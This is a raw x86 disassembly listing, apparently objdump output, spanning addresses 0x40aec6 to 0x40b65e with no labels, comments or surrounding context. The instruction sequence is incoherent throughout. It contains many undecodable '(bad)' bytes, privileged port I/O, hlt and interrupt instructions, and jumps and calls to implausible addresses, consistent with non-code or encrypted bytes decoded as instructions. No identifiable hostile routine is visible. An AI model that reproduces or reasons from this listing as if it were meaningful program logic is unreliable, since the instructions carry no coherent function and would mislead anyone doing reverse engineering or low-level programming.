  40aec6:	adc    cl,ah
  40aec8:	mov    ch,0xff
  40aeca:	cwde   
  40aecb:	scas   eax,DWORD PTR es:[edi]
  40aecc:	mov    ds:0x379bab99,eax
  40aed1:	(bad)
  40aed4:	hlt    
  40aed5:	inc    ebx
  40aed6:	jmp    0x40af50
  40aed8:	outs   dx,BYTE PTR ds:[esi]
  40aed9:	retf   
  40aeda:	sbb    eax,0xe831c8a8
  40aedf:	pop    eax
  40aee0:	pop    esp
  40aee1:	(bad)  
  40aee2:	int    0x94
  40aee4:	mov    bh,0x34
  40aee6:	out    0x19,al
  40aee8:	out    0xcd,al
  40aeea:	out    0xae,eax
  40aeec:	xchg   bh,al
  40aeee:	xor    al,0x52
  40aef0:	out    dx,eax
  40aef1:	or     DWORD PTR [ebp-0x48],ebx
  40aef4:	sub    DWORD PTR [edx+0x67],eax
  40aef7:	stos   BYTE PTR es:[edi],al
  40aef8:	jecxz  0x40af09
  40aefa:	loope  0x40af2d
  40aefc:	idiv   al
  40aefe:	cld    
  40aeff:	mov    ch,0xd
  40af01:	in     eax,0x2
  40af03:	jno    0x40aefe
  40af05:	cmc    
  40af06:	test   eax,0xef8896ec
  40af0b:	sbb    al,BYTE PTR [esi-0x79fdd0e2]
  40af11:	mov    ebx,0x896ecec0
  40af16:	stos   DWORD PTR es:[edi],eax
  40af17:	adc    eax,DWORD PTR [ebx]
  40af19:	mov    gs,WORD PTR [ebp-0x6b]
  40af1c:	cmc    
  40af1d:	imul   esi,DWORD PTR [edx],0xbf45a5ef
  40af23:	lods   eax,DWORD PTR ds:[esi]
  40af24:	arpl   WORD PTR [esi+edx*2+0x5b],dx
  40af28:	jle    0x40af5f
  40af2a:	loopne 0x40aebd
  40af2c:	es sub dh,dh
  40af2f:	add    al,0xef
  40af31:	sub    DWORD PTR [ecx],ebp
  40af33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af34:	cmp    eax,ebp
  40af36:	add    eax,0x4ee855f3
  40af3b:	stos   DWORD PTR es:[edi],eax
  40af3c:	cmp    BYTE PTR [edi-0xc7d5593],ch
  40af42:	sti    
  40af43:	rcl    BYTE PTR [ebx+0x71],cl
  40af46:	add    eax,0x7a260ef6
  40af4b:	cmc    
  40af4c:	fwait
  40af4d:	les    edi,FWORD PTR [edi+0x27238c1a]
  40af53:	dec    eax
  40af54:	add    BYTE PTR [ebp+ebp*8+0x33cf7be3],dh
  40af5b:	test   BYTE PTR [ebp+edx*2-0xc],dl
  40af5f:	xchg   ebp,eax
  40af60:	sbb    BYTE PTR [edx],bl
  40af62:	jge    0x40afcb
  40af64:	call   ebx
  40af66:	push   eax
  40af67:	(bad)  [edi+0x4cc2e149]
  40af6d:	test   eax,0xe97610c1
  40af72:	jo     0x40afc9
  40af74:	cmp    ah,BYTE PTR [edi-0x5047ba15]
  40af7a:	ret    
  40af7b:	ins    DWORD PTR es:[edi],dx
  40af7c:	adc    al,0x7
  40af7e:	jl     0x40af48
  40af80:	push   ebx
  40af81:	hlt    
  40af82:	stos   BYTE PTR es:[edi],al
  40af83:	mov    esi,0x7c0a1b87
  40af88:	or     cl,BYTE PTR [ecx-0x1a544e33]
  40af8e:	and    bl,BYTE PTR [eax+0x59]
  40af91:	xor    ecx,eax
  40af93:	dec    ecx
  40af94:	adc    eax,edx
  40af96:	jns    0x40af36
  40af98:	push   cs
  40af99:	jbe    0x40af5d
  40af9b:	inc    edi
  40af9c:	pop    esp
  40af9d:	sub    eax,0x897c8292
  40afa2:	adc    BYTE PTR [edx],al
  40afa4:	push   cs
  40afa5:	hlt    
  40afa6:	inc    edx
  40afa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afa8:	and    DWORD PTR [edx+0x11b597f3],esi
  40afae:	imul   ebx,DWORD PTR [esi-0x10],0x3def1254
  40afb5:	xchg   edx,eax
  40afb6:	jns    0x40af87
  40afb8:	mov    edx,0x5326add8
  40afbd:	fimul  DWORD PTR [ebx+esi*4+0x3a91da20]
  40afc4:	mov    bl,0xbf
  40afc6:	sbb    DWORD PTR [edi],ebp
  40afc8:	mov    bl,0x40
  40afca:	fst    DWORD PTR [ebp+0x3f185cdb]
  40afd0:	mov    bl,BYTE PTR [edi+0x71]
  40afd3:	lods   eax,DWORD PTR ds:[esi]
  40afd4:	sar    BYTE PTR [edi-0x4a9df60f],0x7c
  40afdb:	jbe    0x40b003
  40afdd:	jl     0x40afd8
  40afdf:	sbb    ecx,ebx
  40afe1:	push   ebx
  40afe2:	push   edx
  40afe3:	and    DWORD PTR [eax-0x76],0x3232db9b
  40afea:	push   esp
  40afeb:	(bad)  
  40afec:	sahf   
  40afed:	lods   al,BYTE PTR ds:[esi]
  40afee:	pop    edi
  40afef:	sbb    edi,DWORD PTR [ecx+0x24786a27]
  40aff5:	or     esp,DWORD PTR [esi+0x1c]
  40aff8:	call   0xb3df79c3
  40affd:	je     0x40b005
  40afff:	sbb    al,0xdd
  40b001:	jle    0x40afea
  40b003:	mov    bl,0x99
  40b005:	neg    DWORD PTR [edi+0x21903632]
  40b00b:	add    BYTE PTR [ebx+0x2c091cf5],ah
  40b011:	sbb    DWORD PTR [edi+0x58],esi
  40b014:	mov    edi,0xbc2fdce9
  40b019:	cmp    eax,0x6ec07b58
  40b01e:	fstp   DWORD PTR ss:[edx-0x32aed418]
  40b025:	xor    al,bh
  40b027:	xor    ebp,esp
  40b029:	mov    ebp,0x511862fc
  40b02e:	mov    esi,0xda2a29d7
  40b033:	std    
  40b034:	stc    
  40b035:	pusha  
  40b036:	cmp    DWORD PTR [ecx-0xa],esi
  40b039:	sbb    eax,0xe0f2e761
  40b03e:	xchg   ebx,eax
  40b03f:	ret    0x844c
  40b042:	loope  0x40aff9
  40b044:	and    BYTE PTR [esi+0x193473f8],al
  40b04a:	sub    ah,0x62
  40b04d:	test   BYTE PTR [ebp+0x4c],dl
  40b050:	add    eax,0x39fbca9e
  40b055:	pop    ds
  40b056:	push   cs
  40b057:	scas   al,BYTE PTR es:[edi]
  40b058:	ror    bl,cl
  40b05a:	daa    
  40b05b:	mov    ss,WORD PTR [ecx-0x73]
  40b05e:	mov    bh,0x68
  40b060:	clc    
  40b061:	add    al,0xc
  40b063:	adc    DWORD PTR [ecx-0x70],esi
  40b066:	cmc    
  40b067:	adc    ah,cl
  40b069:	pminub mm7,mm4
  40b06c:	pop    ecx
  40b06d:	mov    edi,0x646e6233
  40b072:	or     eax,0xa99c78ce
  40b077:	sar    dh,1
  40b079:	(bad)  
  40b07a:	int3   
  40b07b:	mov    WORD PTR [esi+0x5f],ds
  40b07e:	repz jmp 0x40b0ee
  40b081:	jo     0x40b0c4
  40b083:	enter  0x3c28,0xce
  40b087:	mov    al,ds:0x5f1b236e
  40b08c:	jb     0x40b05f
  40b08e:	cmp    DWORD PTR [ebp-0x19739c6d],eax
  40b094:	shr    BYTE PTR [esi+eax*2+0x3f],0xbd
  40b099:	out    dx,eax
  40b09a:	(bad)  
  40b09b:	aam    0x7b
  40b09d:	rcl    BYTE PTR [eax],1
  40b09f:	out    0xa1,eax
  40b0a1:	inc    edx
  40b0a2:	cmc    
  40b0a3:	daa    
  40b0a4:	ror    BYTE PTR [edx-0x35406112],1
  40b0aa:	dec    ebx
  40b0ab:	add    DWORD PTR [edx+0x36],eax
  40b0ae:	iret   
  40b0af:	les    esp,FWORD PTR [edx]
  40b0b1:	jnp    0x40b0c1
  40b0b3:	fadd   st,st(2)
  40b0b5:	pop    eax
  40b0b6:	sbb    DWORD PTR [ebx-0xb89c6f4],esi
  40b0bc:	xchg   ebp,eax
  40b0bd:	out    dx,al
  40b0be:	jo     0x40b0ea
  40b0c0:	sbb    ebp,DWORD PTR [ebp-0xcb5fde5]
  40b0c6:	push   edx
  40b0c7:	push   esi
  40b0c8:	dec    esp
  40b0c9:	loope  0x40b0ac
  40b0cb:	fstp   TBYTE PTR [ecx-0x341ebfa6]
  40b0d1:	outs   dx,DWORD PTR ds:[esi]
  40b0d2:	iret   
  40b0d3:	cmp    esi,DWORD PTR [ebx-0x61]
  40b0d6:	adc    eax,0x9ed3ac91
  40b0db:	and    eax,0x6bdab0f5
  40b0e0:	retf   
  40b0e1:	rol    edi,0xc3
  40b0e4:	jbe    0x40b13d
  40b0e6:	fsubp  st(3),st
  40b0e8:	adc    edx,DWORD PTR [eax+0x5]
  40b0eb:	out    dx,eax
  40b0ec:	sub    al,0x69
  40b0ee:	daa    
  40b0ef:	test   al,0xff
  40b0f1:	inc    edi
  40b0f2:	bnd je 0x40b091
  40b0f5:	sti    
  40b0f6:	add    dl,ch
  40b0f8:	gs (bad) 
  40b0fa:	push   ebx
  40b0fb:	adc    bh,bl
  40b0fd:	sub    al,0x37
  40b0ff:	retf   0x7d5e
  40b102:	push   edi
  40b103:	xchg   ecx,eax
  40b104:	out    0x5a,eax
  40b106:	xchg   ecx,eax
  40b107:	jp     0x40b166
  40b109:	push   ds
  40b10a:	das    
  40b10b:	xor    eax,0x5c0c03eb
  40b110:	mov    ds:0xc0cd47d0,eax
  40b115:	jge    0x40b13d
  40b117:	sub    ah,BYTE PTR [ebx+0x1877894e]
  40b11d:	xlat   BYTE PTR ds:[ebx]
  40b11e:	bound  ebx,QWORD PTR [esp+edx*8-0x6c85c8c]
  40b125:	bound  esp,QWORD PTR [esi]
  40b127:	adc    BYTE PTR [ebx+0x319af49a],ch
  40b12d:	or     ch,BYTE PTR [edi-0x7b28058d]
  40b133:	int    0xfa
  40b135:	and    al,0xeb
  40b137:	mov    WORD PTR [ebx],fs
  40b139:	rol    DWORD PTR [ecx+0x19866189],cl
  40b13f:	add    BYTE PTR [edx],bh
  40b141:	or     DWORD PTR [ecx-0x45ef8a74],edi
  40b147:	pop    ecx
  40b148:	bound  esp,QWORD PTR [ebx+0x2992d6dc]
  40b14e:	test   eax,0x1111c5a8
  40b153:	push   ds
  40b154:	pop    edi
  40b155:	inc    ebx
  40b156:	jecxz  0x40b1bf
  40b158:	int    0x34
  40b15a:	push   0x24
  40b15c:	mov    ch,0xaf
  40b15e:	adc    eax,0x2cd1d2f0
  40b163:	inc    esi
  40b164:	or     ecx,0xffffffbc
  40b167:	data16 fwait
  40b169:	pushf  
  40b16a:	sbb    eax,0x1d7958af
  40b16f:	imul   dx,bx,0x8abf
  40b174:	dec    edx
  40b175:	push   ds
  40b176:	dec    edi
  40b177:	fnstsw WORD PTR [ebx-0x45c5c30a]
  40b17d:	(bad)  
  40b17e:	sbb    eax,0xc6babcc2
  40b183:	sbb    ch,BYTE PTR ds:0xb3138ea0
  40b189:	fdiv   QWORD PTR [edx]
  40b18b:	mov    BYTE PTR [edi+0x50623e09],bh
  40b191:	mov    dl,0x89
  40b193:	std    
  40b194:	jo     0x40b1d0
  40b196:	adc    edx,0xffffffcb
  40b199:	clc    
  40b19a:	cdq    
  40b19b:	sbb    eax,0x6a642e9b
  40b1a0:	adc    edi,ebp
  40b1a2:	neg    DWORD PTR [ecx+ebx*1]
  40b1a5:	dec    ebx
  40b1a6:	aaa    
  40b1a7:	fst    QWORD PTR [edi-0x3517b2cc]
  40b1ad:	leave  
  40b1ae:	hlt    
  40b1af:	and    BYTE PTR [eax],al
  40b1b1:	jg     0x40b1bb
  40b1b3:	or     BYTE PTR [edi-0x38b2acb7],0xfc
  40b1ba:	(bad)  
  40b1bb:	cli    
  40b1bc:	js     0x40b169
  40b1be:	out    0x17,al
  40b1c0:	adc    dh,0x70
  40b1c3:	bound  esi,QWORD PTR [ebx+ebp*8-0x56]
  40b1c7:	mov    ecx,0x5d5ce48
  40b1cc:	bound  ebx,QWORD PTR [eax]
  40b1ce:	imul   edi,DWORD PTR [edx],0x3f7b3a64
  40b1d4:	in     eax,dx
  40b1d5:	dec    ecx
  40b1d6:	sub    dl,BYTE PTR [ebx-0x5dab9853]
  40b1dc:	add    DWORD PTR [edx+0x44710cd0],0xcfcebf67
  40b1e6:	stos   BYTE PTR es:[edi],al
  40b1e7:	mov    ebp,0x8831f471
  40b1ec:	jbe    0x40b190
  40b1ee:	(bad)  
  40b1ef:	mov    edi,0x5378b148
  40b1f4:	sub    edx,DWORD PTR [eax]
  40b1f6:	adc    al,cl
  40b1f8:	ret    
  40b1f9:	es mov al,0x74
  40b1fc:	sahf   
  40b1fd:	scas   eax,DWORD PTR es:[edi]
  40b1fe:	test   ebp,edi
  40b200:	add    eax,0x9d650f0b
  40b205:	mov    ds:0x34c0a47e,eax
  40b20a:	jmp    0x9374:0xc3a54e73
  40b211:	mov    WORD PTR [esi-0x57],fs
  40b214:	jo     0x40b27b
  40b216:	call   0x10eeac46
  40b21b:	add    BYTE PTR [ecx-0x5a],dl
  40b21e:	and    al,0xb8
  40b220:	(bad)  
  40b223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b224:	jo     0x40b256
  40b226:	xchg   esp,eax
  40b227:	jl     0x40b248
  40b229:	jp     0x40b24e
  40b22b:	pop    edi
  40b22c:	mov    DWORD PTR [ebp-0xc9dce84],ebx
  40b232:	retf   
  40b233:	inc    esi
  40b234:	fst    QWORD PTR [esi+edx*8+0x0]
  40b238:	std    
  40b239:	mov    edi,0x87f7290d
  40b23e:	jmp    0x40b26b
  40b240:	popa   
  40b241:	mov    bl,0x4f
  40b243:	sub    al,ch
  40b245:	xor    BYTE PTR [ecx],dh
  40b247:	test   al,0x1a
  40b249:	test   al,0x60
  40b24b:	add    dh,BYTE PTR ds:0xdb4ce996
  40b251:	xor    eax,0x23613c45
  40b256:	pop    edx
  40b257:	push   esi
  40b258:	and    DWORD PTR [ecx-0x3fa80c4f],esp
  40b25e:	add    al,0xd5
  40b260:	or     dh,BYTE PTR [edx+0x32f993a6]
  40b266:	leave  
  40b267:	fstp   DWORD PTR [di-0x76]
  40b26b:	and    al,BYTE PTR [edx-0x2713f904]
  40b271:	aas    
  40b272:	pop    ebx
  40b273:	cmp    BYTE PTR [edx-0x6d],ch
  40b276:	xor    eax,0xe0841beb
  40b27b:	cmp    DWORD PTR [esi+eax*4+0x5ded4b8a],ebp
  40b282:	adc    DWORD PTR [edx+esi*1-0x48d7a5ad],0xd750bb8
  40b28d:	retf   0xf16
  40b290:	mov    ecx,0xe3f29c6c
  40b295:	addr16 jl 0x40b2a6
  40b298:	ja     0x40b24a
  40b29a:	icebp  
  40b29b:	mul    DWORD PTR [ebx+edx*2+0x652e1212]
  40b2a2:	enter  0xf1c5,0x47
  40b2a6:	mul    BYTE PTR [ecx+0x74]
  40b2a9:	adc    al,0xf9
  40b2ab:	sub    eax,0x20dc51b9
  40b2b0:	sub    ch,BYTE PTR [ebx]
  40b2b2:	inc    esp
  40b2b3:	sub    eax,0x47a86915
  40b2b8:	lea    ebx,[ebp-0x3ac226f2]
  40b2be:	mov    esp,0x409e08e4
  40b2c3:	cmp    BYTE PTR [edx-0x46],al
  40b2c6:	cdq    
  40b2c7:	cmp    DWORD PTR [ebx*4-0x54cf26ab],esp
  40b2ce:	xchg   esi,eax
  40b2cf:	in     al,0x96
  40b2d1:	jmp    FWORD PTR [ebx]
  40b2d3:	mov    al,ds:0x32fce786
  40b2d8:	cmp    esi,eax
  40b2da:	outs   dx,DWORD PTR ds:[esi]
  40b2db:	es data16 out 0xa2,al
  40b2df:	and    ebx,DWORD PTR [edi-0x27]
  40b2e2:	shl    DWORD PTR [edi],0x25
  40b2e5:	sub    ebp,DWORD PTR [esi]
  40b2e7:	mov    DWORD PTR [edx-0x7a],esp
  40b2ea:	push   0x7a201689
  40b2ef:	nop
  40b2f0:	inc    eax
  40b2f1:	out    0xd,al
  40b2f3:	dec    ebp
  40b2f4:	js     0x40b33d
  40b2f6:	imul   esi,DWORD PTR [ebp+0x6f],0xf40950d8
  40b2fd:	pusha  
  40b2fe:	push   cs
  40b2ff:	clc    
  40b300:	pop    ecx
  40b301:	jne    0x40b2b1
  40b303:	ja     0x40b2ff
  40b305:	lds    edx,FWORD PTR [esi-0x14]
  40b308:	cmp    al,0x7d
  40b30a:	jno    0x40b2bd
  40b30c:	not    BYTE PTR [edi+ecx*4+0x62]
  40b310:	sub    edx,DWORD PTR [edx+eiz*2]
  40b313:	xor    DWORD PTR [edi-0x66],edx
  40b316:	cdq    
  40b317:	sub    al,0xa5
  40b319:	popf   
  40b31a:	jo     0x40b367
  40b31c:	cdq    
  40b31d:	fsub   QWORD PTR [eax+0x21dd237]
  40b323:	pop    esi
  40b324:	mov    ebp,0x80c3a7a9
  40b329:	in     eax,0xdf
  40b32b:	fs rcr edx,1
  40b32e:	inc    edx
  40b32f:	jge    0x40b36c
  40b331:	and    DWORD PTR [edx+0x5a131ed4],ecx
  40b337:	aad    0xa6
  40b339:	fdivr  DWORD PTR [ebx-0x5ca326e8]
  40b33f:	sahf   
  40b340:	xor    ebp,esi
  40b342:	sbb    BYTE PTR [edi-0x41],ch
  40b345:	pmuludq mm7,mm2
  40b348:	xlat   BYTE PTR ds:[ebx]
  40b349:	and    esp,DWORD PTR ds:0x3aff4e8a
  40b34f:	pop    eax
  40b350:	or     ebp,DWORD PTR [eax-0x6c]
  40b353:	js     0x40b33a
  40b355:	fist   DWORD PTR [ebp-0x2b7a34c0]
  40b35b:	shl    BYTE PTR [eax+0x239d562d],cl
  40b361:	xor    al,0xa6
  40b363:	das    
  40b364:	stc    
  40b365:	es fcmovbe st,st(2)
  40b368:	or     eax,0xadd70fdb
  40b36d:	pop    ecx
  40b36e:	fsub   QWORD PTR [esi-0x3b2a40c8]
  40b374:	cmp    eax,0xc2a5f9b9
  40b379:	fmul   DWORD PTR [ebx]
  40b37b:	inc    eax
  40b37c:	arpl   WORD PTR [esp+eiz*4],di
  40b37f:	test   al,0xc8
  40b381:	jle    0x40b33c
  40b383:	mov    al,0x3
  40b385:	dec    ebp
  40b386:	push   esi
  40b387:	mov    ebx,DWORD PTR [ecx+0x1e8066ff]
  40b38d:	cs or  ebx,eax
  40b390:	popa   
  40b391:	or     BYTE PTR [edi-0x6450f45b],0xee
  40b398:	pushf  
  40b399:	(bad)  
  40b39a:	mov    bh,0x60
  40b39c:	cmp    BYTE PTR [eax+0x3ea1a467],bh
  40b3a2:	mov    edx,0x3064691c
  40b3a7:	(bad)  
  40b3a8:	call   0x327b2460
  40b3ad:	pop    ecx
  40b3ae:	in     eax,dx
  40b3af:	das    
  40b3b0:	sahf   
  40b3b1:	mov    cl,0xe0
  40b3b3:	repz jno 0x40b3b6
  40b3b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3b7:	mov    cs,ebp
  40b3b9:	pop    ecx
  40b3ba:	dec    esp
  40b3bb:	scas   al,BYTE PTR es:[edi]
  40b3bc:	lea    edx,ds:0xa7a017c8
  40b3c2:	shl    BYTE PTR [edi],cl
  40b3c4:	fs test al,0x43
  40b3c7:	es mov bh,ch
  40b3ca:	aad    0x86
  40b3cc:	lock inc esi
  40b3ce:	and    ecx,esi
  40b3d0:	dec    ebp
  40b3d1:	loope  0x40b422
  40b3d3:	jp     0x40b3f4
  40b3d5:	cmp    bl,cl
  40b3d7:	pop    esp
  40b3d8:	cmp    al,BYTE PTR [ebx+ecx*8+0xf8af254]
  40b3df:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40b3e1:	inc    esi
  40b3e2:	mov    edx,0x5e48112e
  40b3e7:	ret    
  40b3e8:	cmp    al,0x14
  40b3ea:	(bad)  
  40b3eb:	dec    BYTE PTR [edx+0x62]
  40b3ee:	pop    edx
  40b3ef:	cwde   
  40b3f0:	stos   DWORD PTR es:[edi],eax
  40b3f1:	pop    es
  40b3f2:	xchg   ecx,eax
  40b3f3:	sbb    eax,0x13421e32
  40b3f8:	or     al,0xfb
  40b3fa:	sbb    al,ah
  40b3fc:	jb     0x40b396
  40b3fe:	xchg   ecx,eax
  40b3ff:	jp     0x40b3f9
  40b401:	enter  0xf5da,0xad
  40b405:	push   ds
  40b406:	xor    al,ch
  40b408:	mov    al,0x7d
  40b40a:	scas   eax,DWORD PTR es:[edi]
  40b40b:	cs push ds
  40b40d:	push   edx
  40b40e:	enter  0x89cc,0x99
  40b412:	mov    cl,0xa7
  40b414:	jg     0x40b3ca
  40b416:	iret   
  40b417:	xor    ebp,DWORD PTR [edi]
  40b419:	or     edi,DWORD PTR [edi+0x61ef6b75]
  40b41f:	fstp   TBYTE PTR [edi]
  40b421:	in     al,0xc1
  40b423:	clc    
  40b424:	jbe    0x40b425
  40b426:	sbb    al,bl
  40b428:	pop    ecx
  40b429:	push   ebp
  40b42a:	adc    ebx,DWORD PTR [esi+eax*8+0x77]
  40b42e:	imul   ecx,DWORD PTR [esi],0xffffffbc
  40b431:	add    eax,0xffffffba
  40b434:	(bad)  
  40b435:	mov    ds:0xc142f66a,eax
  40b43a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b43b:	imul   esp,edi,0x58
  40b43e:	sbb    DWORD PTR [ecx+0x62],esi
  40b441:	ss es dec eax
  40b444:	jns    0x40b44c
  40b446:	out    dx,al
  40b447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b448:	adc    dh,BYTE PTR [edx+0x4a46ed6d]
  40b44e:	xchg   edi,eax
  40b44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b450:	in     al,dx
  40b451:	dec    edi
  40b452:	sahf   
  40b453:	lods   al,BYTE PTR ds:[esi]
  40b454:	add    BYTE PTR [esi],ch
  40b456:	xchg   esi,eax
  40b457:	pop    esp
  40b458:	add    eax,0xef9e54a5
  40b45d:	sar    DWORD PTR [ebp-0x2],cl
  40b460:	hlt    
  40b461:	sub    eax,DWORD PTR [si+0xc]
  40b465:	retf   
  40b466:	in     eax,0xa2
  40b468:	pop    ss
  40b469:	mov    al,ds:0x4ae58a11
  40b46e:	(bad)  
  40b46f:	ds je  0x40b4df
  40b472:	cmp    esi,DWORD PTR [ecx+0x38]
  40b475:	out    dx,eax
  40b476:	cmpxchg DWORD PTR [edx-0x17e8a31e],ebx
  40b47d:	cmp    al,al
  40b47f:	shl    dh,1
  40b481:	rcr    eax,0x5a
  40b484:	mov    ebx,DWORD PTR [esi-0x55da8b01]
  40b48a:	pop    esp
  40b48b:	sub    DWORD PTR [ebx-0xc],ecx
  40b48e:	and    dl,BYTE PTR [edi+0x538be5a3]
  40b494:	xchg   dh,dh
  40b496:	jecxz  0x40b430
  40b498:	nop
  40b499:	xor    DWORD PTR [edi+0xc],eax
  40b49c:	xor    al,0xc2
  40b49e:	lds    ecx,FWORD PTR [eax]
  40b4a0:	mov    fs,ecx
  40b4a2:	add    edi,DWORD PTR [ecx+0x3c]
  40b4a5:	mov    ds:0x84ab4619,eax
  40b4aa:	stc    
  40b4ab:	mov    ds:0xdc231d81,al
  40b4b0:	test   al,0xba
  40b4b2:	stc    
  40b4b3:	out    dx,al
  40b4b4:	fmul   QWORD PTR ds:0xb374604e
  40b4ba:	fisubr WORD PTR [esp+edi*8-0x254cce52]
  40b4c1:	sti    
  40b4c2:	mov    ds:0x7d3db1b5,eax
  40b4c7:	nop
  40b4c8:	imul   eax,esp,0xffffff9a
  40b4cb:	sbb    al,0x75
  40b4cd:	xlat   BYTE PTR ds:[ebx]
  40b4ce:	xchg   ebx,eax
  40b4cf:	pusha  
  40b4d0:	(bad)  
  40b4d1:	je     0x40b4ae
  40b4d3:	(bad)  
  40b4d4:	ja     0x40b460
  40b4d6:	mov    ecx,0xe68bb775
  40b4db:	clc    
  40b4dc:	xchg   esp,eax
  40b4dd:	loop   0x40b540
  40b4df:	xlat   BYTE PTR ds:[ebx]
  40b4e0:	sub    dl,bl
  40b4e2:	mov    eax,ds:0x7a6018b9
  40b4e7:	xor    al,0xea
  40b4e9:	sub    DWORD PTR [ecx-0x58dabaac],0x3f
  40b4f0:	sub    DWORD PTR [edx+eiz*2],eax
  40b4f3:	push   esp
  40b4f4:	dec    ebp
  40b4f5:	jmp    0x40b485
  40b4f7:	push   0xed62c5bc
  40b4fc:	lods   al,BYTE PTR ds:[esi]
  40b4fd:	mov    al,ds:0xc12191a4
  40b502:	inc    esi
  40b503:	or     BYTE PTR [edx+0x2],bh
  40b506:	mov    ch,0x35
  40b508:	in     eax,0xc9
  40b50a:	cdq    
  40b50b:	dec    edi
  40b50c:	ins    BYTE PTR es:[edi],dx
  40b50d:	mov    dl,0x1f
  40b50f:	sub    DWORD PTR [ebp-0x4d],edi
  40b512:	pop    edx
  40b513:	sbb    edi,DWORD PTR [ebx+0x2f]
  40b516:	pop    ebx
  40b517:	ret    0xf272
  40b51a:	cli    
  40b51b:	mov    ch,0xb7
  40b51d:	dec    esp
  40b51e:	outs   dx,BYTE PTR ds:[esi]
  40b51f:	add    edi,DWORD PTR [esi+edx*2]
  40b522:	mov    es,ecx
  40b524:	fsubrp st(7),st
  40b526:	loop   0x40b4c5
  40b528:	inc    eax
  40b529:	xchg   ecx,eax
  40b52a:	in     al,0x1f
  40b52c:	pushf  
  40b52d:	mov    ch,0x45
  40b52f:	cmp    bh,BYTE PTR [eax+esi*4]
  40b532:	ret    
  40b533:	bound  ebp,QWORD PTR [edi]
  40b535:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b536:	ins    BYTE PTR es:[edi],dx
  40b537:	jno    0x40b512
  40b539:	ror    BYTE PTR [edx+0x3677cc9c],0x3a
  40b540:	or     eax,DWORD PTR [ebp+0x3f6e9660]
  40b546:	loopne 0x40b5a6
  40b548:	rcl    BYTE PTR [eax+0x7e],0x1d
  40b54c:	ja     0x40b5bc
  40b54e:	sub    al,0xad
  40b550:	jno    0x40b4d2
  40b552:	add    DWORD PTR [ebx],edx
  40b554:	mov    esi,0x65cb788c
  40b559:	mov    WORD PTR [ebx],ds
  40b55b:	pop    esi
  40b55c:	ds mov dl,0x21
  40b55f:	pop    esi
  40b560:	push   0x1e
  40b562:	or     eax,0xa64f228e
  40b567:	sbb    ch,cl
  40b569:	fs xor eax,0x7ca8f103
  40b56f:	or     BYTE PTR [eax+0x15],ch
  40b572:	fidivr DWORD PTR [esi-0x77]
  40b575:	retf   
  40b576:	retf   
  40b577:	mov    ebp,ebp
  40b579:	inc    ebp
  40b57a:	loop   0x40b523
  40b57c:	mov    bh,0x31
  40b57e:	inc    edi
  40b57f:	ret    
  40b580:	push   edi
  40b581:	not    DWORD PTR ds:0xb586deb6
  40b587:	pop    edx
  40b588:	and    eax,0xe92207fb
  40b58d:	add    al,0xbf
  40b58f:	xchg   edi,eax
  40b590:	mov    esp,0x41ab9526
  40b595:	(bad)  
  40b596:	push   ss
  40b597:	gs xchg esp,eax
  40b599:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b59a:	mov    esi,0x7e0d7c55
  40b59f:	mov    WORD PTR [ecx-0x6e],?
  40b5a2:	jecxz  0x40b58f
  40b5a4:	sti    
  40b5a5:	dec    eax
  40b5a6:	jl     0x40b586
  40b5a8:	jecxz  0x40b5e8
  40b5aa:	js     0x40b5f8
  40b5ac:	or     BYTE PTR ss:[ebp+0x2c],dl
  40b5b0:	mov    BYTE PTR [edx-0x5a71656e],bl
  40b5b6:	das    
  40b5b7:	fimul  DWORD PTR [ecx+0x52]
  40b5ba:	aad    0xb9
  40b5bc:	push   ss
  40b5bd:	int3   
  40b5be:	mov    BYTE PTR [edi],bl
  40b5c0:	mov    ecx,0x14e4dae9
  40b5c5:	mov    WORD PTR [esi+0x46f4348e],bx
  40b5cc:	test   DWORD PTR ds:[eiz*8+0xd49adde],esp
  40b5d4:	xor    esp,DWORD PTR [esi]
  40b5d6:	sub    ah,BYTE PTR [ecx-0x42dd1340]
  40b5dc:	add    esi,edi
  40b5de:	fist   WORD PTR [edx+0x76]
  40b5e1:	sbb    edi,DWORD PTR es:[ebp+0x6f3ed540]
  40b5e8:	sti    
  40b5e9:	push   edi
  40b5ea:	mov    fs,WORD PTR [eax-0x265f325c]
  40b5f0:	in     eax,dx
  40b5f1:	in     al,0xbd
  40b5f3:	sub    ebp,DWORD PTR [esi-0x76da30e8]
  40b5f9:	jl     0x40b5b0
  40b5fb:	jp     0x40b670
  40b5fd:	cdq    
  40b5fe:	das    
  40b5ff:	jne    0x40b663
  40b601:	fimul  DWORD PTR ds:0xe33795e3
  40b607:	jecxz  0x40b5f6
  40b609:	out    0xcd,al
  40b60b:	jno    0x40b683
  40b60d:	add    DWORD PTR [ebp+0x4e],ebp
  40b610:	xor    DWORD PTR [ebx],ecx
  40b612:	test   edi,ecx
  40b614:	push   ebx
  40b615:	ret    0xa789
  40b618:	push   0xffffffb7
  40b61a:	sub    DWORD PTR [ebp-0x6e465d72],ecx
  40b620:	xor    edi,DWORD PTR [ebp+0x61b216b7]
  40b626:	dec    ecx
  40b627:	fidiv  DWORD PTR [ecx]
  40b629:	xchg   ebx,eax
  40b62a:	js     0x40b5e4
  40b62c:	shr    DWORD PTR [ecx-0x6dac653a],cl
  40b632:	pusha  
  40b633:	push   eax
  40b634:	sub    BYTE PTR [ebx-0x2a],ch
  40b637:	scas   al,BYTE PTR es:[edi]
  40b638:	or     BYTE PTR [edi-0x7e],0xf4
  40b63c:	(bad)  
  40b63d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b63e:	dec    edi
  40b63f:	sbb    bl,bh
  40b641:	push   eax
  40b642:	cmp    eax,0xd9ed7ca4
  40b647:	or     dl,al
  40b649:	adc    al,0x61
  40b64b:	mov    DWORD PTR [edi],ecx
  40b64d:	mov    ss,WORD PTR [eax]
  40b64f:	mov    ah,0x57
  40b651:	push   ecx
  40b652:	cdq    
  40b653:	push   0xffde7b0c
  40b658:	dec    cl
  40b65a:	fidivr DWORD PTR [edx]
  40b65c:	push   eax
  40b65d:	scas   eax,DWORD PTR es:[edi]
  40b65e:	(bad)  
